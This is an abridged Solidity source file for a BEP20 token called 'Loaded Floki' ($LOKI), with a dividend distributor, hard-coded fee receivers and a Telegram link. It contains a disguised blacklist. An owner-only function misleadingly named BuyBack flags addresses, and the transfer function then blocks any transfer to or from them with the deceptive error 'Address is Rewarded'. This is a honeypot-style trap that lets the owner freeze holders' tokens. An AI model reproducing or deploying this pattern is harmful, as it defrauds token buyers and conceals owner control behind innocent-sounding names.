...
/**
telegram : https://t.me/LoadedFloki
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 rewardtoken = IBEP20(0x55d398326f99059fF775485246999027B3197955); // REWARD 
...
contract LoadedFloki is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Loaded Floki";
    string constant _symbol = "$LOKI";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x554A3d719Fed3693f80C86F503DAC52ea334eA67;
        buybackFeeReceiver = msg.sender;
        devFeeReceiver = 0x554A3d719Fed3693f80C86F503DAC52ea334eA67;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isBuyBack[recipient] && !isBuyBack[sender], 'Address is Rewarded');
    ...
    function BuyBack(address _address, bool _value) public authorized{
        isBuyBack[_address] = _value;
    }
